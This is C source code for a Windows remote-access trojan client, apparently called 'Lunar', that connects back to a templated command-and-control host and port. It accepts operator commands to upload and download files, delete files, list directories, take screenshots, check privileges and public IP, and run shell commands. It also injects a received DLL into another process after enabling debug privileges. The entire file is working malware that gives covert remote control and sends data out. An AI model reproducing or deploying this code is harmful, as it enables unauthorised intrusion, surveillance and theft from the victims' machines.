#include "lunar.h"
#include "FileTunnel.h"
#include "LoadLibraryR.h"

int fsize = 0;
char* fileinfo[3];
char temp[BUFFER];

TOKEN_PRIVILEGES priv = { 0 };
HANDLE hModule = NULL;
HANDLE hProcess = NULL;
HANDLE hToken = NULL;


#define BREAK_WITH_ERROR( e ) { sockprintf(sockfd, "[-] %s. Error=%ld", e, GetLastError() ); break; }


void sockprintf(SOCKET sock, const char* words, ...) {
    static char textBuffer[BUFFER];
    memset(textBuffer, '\0', BUFFER);
    va_list args;
    va_start(args, words);
    vsprintf(textBuffer, words, args);
    va_end(args);
    sockSend(textBuffer);
}

void REConnect(void)
{
    closesocket(sockfd);
    WSACleanup();
    Sleep(5000);
    MainConnect();
}

void sockSend(const char* data)
{
    int lerror = WSAGetLastError();
    int totalsent = 0;
    int buflen = strlen(data);
    while (buflen > totalsent) {
        int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
        if (lerror == WSAECONNRESET)
        {
            connected = FALSE;
        }
        if (r < 0) return;
        totalsent += r;
    }
    return;
}

void lunar_main(void)
{
    while (connected)
    {
        memset(recvbuf, '\0', BUFFER);
        int return_code = recv(sockfd, recvbuf, BUFFER, 0);
        if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
        {
            connected = FALSE;
        }

        if (strcmp(recvbuf, "checkhost") == 0)
        {
            memset(recvbuf, '\0', BUFFER);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }
            CheckHost(recvbuf);

        }

        else if (strcmp(recvbuf, "gethostname") == 0){
            memset(recvbuf, '\0', BUFFER);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }
            sockprintf(sockfd, "%s - %s", recvbuf, IP2Host(recvbuf));
        }

        else if(strcmp(recvbuf, "checkport") == 0)
        {
            memset(recvbuf, '\0', BUFFER);
            memset(fileinfo, '\0', 2);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }
            split(recvbuf, fileinfo, ",");
            checkPort(fileinfo[0], atoi(fileinfo[1]));
        }

        else if (strcmp(recvbuf, "frecv") == 0)
        {

            int expected = 0;
            DWORD dwBytesWritten = 0;
            BOOL write;
            memset(temp, '\0', BUFFER);
            memset(fileinfo, '\0', 2);
            int return_code = recv(sockfd, temp, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }
            split(temp, fileinfo, ":");
            expected = atoi(fileinfo[1]);

            HANDLE recvfile = CreateFile(fileinfo[0], FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (recvfile == INVALID_HANDLE_VALUE) {
                sockprintf(sockfd, "[Error Creating File] : %ld", GetLastError());
            }
            else {
                memset(recvbuf, '\0', BUFFER);
                int total = 0;

                do {
                    fsize = recv(sockfd, recvbuf, BUFFER, 0);
                    if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                    {
                        connected = FALSE;
                        printf("[X] Connection interrupted while receiving file %s for %s size.", fileinfo[0], fileinfo[1]);
                    }
                    else if (fsize == 0) {
                        break;
                    }
                    else {
                        write = WriteFile(recvfile, recvbuf, fsize, &dwBytesWritten, NULL);
                        total += fsize; //
                    }
                } while (total != expected);

                if (write == FALSE)
                {
                    sockprintf(sockfd, "[Error Writing file %s of %s size] Error : %ld.", fileinfo[0], fileinfo[1], GetLastError());
                }
                else {
                    sockprintf(
                        sockfd,
                        "F_OK,%s,%i,%s\\%s",
                        fileinfo[0],
                        total,
                        cDir(),
                        fileinfo[0]
                    );
                }
                CloseHandle(recvfile);
            }
        }
        else if (strcmp(recvbuf, "fdll") == 0)
        {

            memset(temp, '\0', BUFFER);
            int return_code = recv(sockfd, temp, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                break;
            }
            split(temp, fileinfo, ":");
            int expected = atoi(fileinfo[1]);
            DWORD dwProcessId = ProcessId(fileinfo[2]);
            unsigned char* DLL = HeapAlloc(GetProcessHeap(), 0, expected + 1);

            memset(recvbuf, '\0', BUFFER);
            ZeroMemory(DLL, expected + 1);
            int total = 0;

            do {
                fsize = recv(sockfd, recvbuf, BUFFER, 0);
                if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = FALSE;
                }
                else if (fsize == 0) {
                    break;
                }
                else {
                    memcpy(DLL + total, recvbuf, fsize);
                    total += fsize;
                }
            } while (total != expected);

            do {
                if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
                {
                    priv.PrivilegeCount = 1;
                    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
                        AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);

                    CloseHandle(hToken);
                }

                hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
                if (!hProcess)
                    BREAK_WITH_ERROR("Failed to open the target process");

                hModule = LoadRemoteLibraryR(hProcess, DLL, expected + 1, NULL);
                if (!hModule)
                    BREAK_WITH_ERROR("Failed to inject the DLL");

                WaitForSingleObject(hModule, -1);
                sockprintf(sockfd, "DLL_OK:%ld", dwProcessId);
            } while (0);

            if (DLL)
            {
                HeapFree(GetProcessHeap(), 0, DLL);

            }
            if (hProcess)
            {
                CloseHandle(hProcess);
            }

        }
        else if (strstr(recvbuf, "fupload") != NULL)
        {
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, ":");
            
            int bytes_read;
            BOOL upload = TRUE;
            FILE* fs;
           
            do {

                for (int i = 0; i < 2; i++) {
                    if (*fileinfo[i] == '\0')
                    {
                        sockprintf(sockfd, "[ Invalid File Download Request ]\n");
                        upload = FALSE;
                        break;
                    }
                }

                if (upload) {
                    if ((fs = fopen(fileinfo[1], "rb")) != NULL)
                    {
                        fseek(fs, 0L, SEEK_END);
                        long filesize = ftell(fs);
                        fseek(fs, 0, SEEK_SET);

                        if(filesize <= 0){
                            sockprintf(sockfd, "File '%s' is of 0 bytes.", fileinfo[1]);
                            fclose(fs);
                            upload = FALSE;
                            break;
                        }

                        sockprintf(sockfd, "FILE:%s:%ld", fileinfo[1], filesize);
                        Sleep(1000);
                        char fbuffer[500];
                        memset(fbuffer, '\0', 500);
                        while (!feof(fs)) {
                            if ((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0) {
                                send(sockfd, fbuffer, bytes_read, 0);
                            }
                            else {
                                upload = FALSE;
                                break;
                            }
                        }
                        fclose(fs);
                    }

                    else {
                        sockprintf(sockfd, "[ Error Opening file %s (Error %ld) ]", fileinfo[1], GetLastError());
                    }
                }

                upload = FALSE;

            } while (upload);
            
        }

        else if (strcmp(recvbuf, "lunar_host") == 0)
        {
            UserPC();
        }

        else if (strcmp(recvbuf, "listdir") == 0)
        {
            WIN32_FIND_DATA data;
            HANDLE hFind;
            hFind = FindFirstFile("*", &data);  
            int i = 0;
            char dir[BUFFER];
            if (hFind != INVALID_HANDLE_VALUE)
            {
                memset(dir, 0, BUFFER);
                snprintf(dir, BUFFER, "Listing '%s'\n-------------------\n", cDir());
                do {
                    int len = strlen(dir);
                    if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                        snprintf(dir + len, sizeof(dir) - len, "[DIRECTORY] %s\n", data.cFileName);
                    }
                    else {
                        ULONGLONG FileSize = data.nFileSizeHigh;
                        FileSize <<= sizeof(data.nFileSizeHigh) * 8;
                        FileSize |= data.nFileSizeLow;
                        snprintf(dir + len, sizeof(dir) - len, "[FILE] %s (%u bytes)\n", data.cFileName, FileSize);
                    }
                } while (FindNextFile(hFind, &data));

                sockSend(dir);
            }
        } 

        else if (strcmp(recvbuf, "dlloutput") == 0)
        {
            sockSend(GetInputOutput());
        }

        else if (strcmp(recvbuf, "cd") == 0)
        {
            memset(recvbuf, '\0', BUFFER);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }

            if (!SetCurrentDirectory(recvbuf))
            {
                int x = GetLastError();

                switch (x) {
                case 2:
                    sockprintf(sockfd, "Error Changing Directory, File or Folder not Found (Error code %i)", x);
                    break;
                case 3:
                    sockprintf(sockfd, "Error Changing Directory, Path not found (Error Code %i)", x);
                    break;
                case 5:
                    sockprintf(sockfd, "Error Changing Directory, Access Denied (Error Code %i)", x);
                    break;
                default:
                    sockprintf(sockfd, "Error Changing Directory, Error %i", x);
                    break;
                }  
            }
            else {
                sockprintf(sockfd, "Directory Changed to '%s'", cDir());
            }
        } 
        

        else if (strstr(recvbuf, "delete") != NULL)
        {
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, ":");
            if (isFile(fileinfo[1]))
            {
                if (DeleteFile(fileinfo[1]))
                {
                    sockprintf(sockfd, "DEL_OK,%s,%s", fileinfo[1], cDir());
                }
                else {
                    sockprintf(sockfd, "Error Deleting file : %i", GetLastError());
                }
                
            }
            else {
                sockprintf(sockfd, "File '%s' does not exist.", fileinfo[1]);
            }
        }


        else if (strcmp(recvbuf, "screenshot") == 0) {
            CaptureAnImage(GetDesktopWindow());
        }
        

        else if (strstr(recvbuf, "psinfo") != NULL)
        {
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, ":");
            char FILEPATH[BUFFER];
            memset(FILEPATH, '\0', BUFFER);
            DWORD pid = ProcessId(fileinfo[1]);
            HANDLE procHandle;
            if (pid != 0)
            {
                procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
                if (procHandle != NULL) {
                    if (GetModuleFileNameEx(procHandle, NULL, FILEPATH, MAX_PATH) != 0)
                    {

                        sockprintf(sockfd, "PROCESS,%s,%ld,%s", fileinfo[1], pid, FILEPATH);
                    }
                    else {
                        sockprintf(sockfd, "PROCESS,%s,%ld,(error : %ld)", fileinfo[1], pid, GetLastError());
                    }
                    CloseHandle(procHandle);
                }
                else {
                    sockprintf(sockfd, "Failed to open Process : %s", fileinfo[1]);
                }
            }
            else {
                sockprintf(sockfd, "Process not running.");
            }
        }



        else if (strcmp(recvbuf, "isadmin") == 0)
        {
            if (IsAdmin())
            {
                sockprintf(sockfd, "ADMIN:TRUE");
            }
            else {
                sockprintf(sockfd, "ADMIN:FALSE");
            }

        } 



        else if (strcmp(recvbuf, "wanip") == 0)
        {   
            char* wanip[BUFFER];
            HINTERNET hInternet, hFile;
            DWORD rSize;
            if(InternetCheckConnection("http://www.google.com", 1, 0)){
                memset(wanip, '\0', BUFFER);
                hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
                hFile = InternetOpenUrl(hInternet, "http://bot.whatismyipaddress.com/", NULL, 0, INTERNET_FLAG_RELOAD, 0);
                InternetReadFile(hFile, &wanip, sizeof(wanip), &rSize);
                wanip[rSize] = '\0';

                InternetCloseHandle(hFile);
                InternetCloseHandle(hInternet);
                sockprintf(sockfd, "WANIP:%s", wanip);
            } else {
                sockprintf(sockfd, "No Internet Connection detected ...");
            }
        }

        else if (strcmp(recvbuf, "lunarpid") == 0){
            sockprintf(sockfd, "LUNARPID:%s", LunarInfo());
        }

        else {
            ExecSock();
        }

    }

    if (!connected)
    {
        REConnect();
    }
}

void StartWSA(void)
{
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[Error] Error Starting Winsock.");
        WSAReportError();
    }
}


void MainConnect(void)
{
    StartWSA();
    sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
    {
        printf("Socket Creation Error. ");

        WSAReportError();
        exit(1);
    }

    server.sin_addr.s_addr = inet_addr("{{serverhost}}");
    server.sin_port = htons({{serverport}});
    server.sin_family = AF_INET;

    do {
        if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            REConnect();
        }
        else {
            connected = TRUE;
        }
    } while (!connected);

    lunar_main();
}
